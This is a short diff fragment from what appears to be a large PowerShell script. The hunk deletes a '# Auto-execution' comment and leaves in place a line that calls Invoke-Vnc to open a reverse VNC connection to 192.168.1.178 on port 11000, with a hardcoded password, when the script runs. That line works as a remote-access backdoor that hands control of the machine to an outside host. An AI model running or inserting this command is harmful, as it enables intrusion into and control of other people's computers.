@@ -2730,5 +2730,4 @@ Main
 }
 
 
-# Auto-execution
 Invoke-Vnc -ConType reverse -IpAddress 192.168.1.178 -Port 11000 -Password P@ssw0rd
